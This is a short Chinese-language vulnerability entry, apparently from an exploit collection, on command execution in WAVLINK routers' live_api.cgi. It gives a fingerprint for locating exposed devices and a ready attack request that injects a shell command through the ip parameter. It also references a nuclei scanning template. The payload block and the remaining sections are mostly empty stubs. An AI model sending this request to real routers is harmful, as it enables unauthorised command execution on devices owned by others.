# WAVLINKlive_api.cgi存在命令执行

- **系统**：WAVLINKlive　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="firstFlage"`
- **请求**：`GET /cgi-bin/live_api.cgi?page=abc&id=173&ip=;id; HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

nuclei脚本\
\[wanlink-router-live-api-cgi-rce.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- WAVLINK live\_api.cgi 存在命令执行: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * wavlink 路由器